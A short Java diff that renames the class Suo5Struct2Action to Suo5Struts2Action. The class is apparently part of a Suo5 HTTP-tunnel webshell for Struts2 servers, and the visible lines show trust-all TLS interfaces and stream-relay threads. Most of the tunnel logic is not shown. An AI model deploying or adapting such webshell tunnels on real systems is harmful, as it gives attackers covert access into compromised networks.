@@ -16,7 +16,7 @@ import java.util.HashMap;
  * @author ReaJason
  * @since 2024/12/15
  */
-public class Suo5Struct2Action implements Runnable, HostnameVerifier, X509TrustManager {
+public class Suo5Struts2Action implements Runnable, HostnameVerifier, X509TrustManager {
     public static String headerName;
     public static String headerValue;
     public static HashMap addrs = collectAddr();
@@ -25,10 +25,10 @@ public class Suo5Struct2Action implements Runnable, HostnameVerifier, X509TrustM
     InputStream gInStream;
     OutputStream gOutStream;
 
-    public Suo5Struct2Action() {
+    public Suo5Struts2Action() {
     }
 
-    public Suo5Struct2Action(InputStream in, OutputStream out) {
+    public Suo5Struts2Action(InputStream in, OutputStream out) {
         this.gInStream = in;
         this.gOutStream = out;
     }
@@ -268,7 +268,7 @@ public class Suo5Struct2Action implements Runnable, HostnameVerifier, X509TrustM
 
         Thread t = null;
         try {
-            Suo5Struct2Action p = new Suo5Struct2Action(scInStream, respOutStream);
+            Suo5Struts2Action p = new Suo5Struts2Action(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
             readReq(reqInputStream, scOutStream);
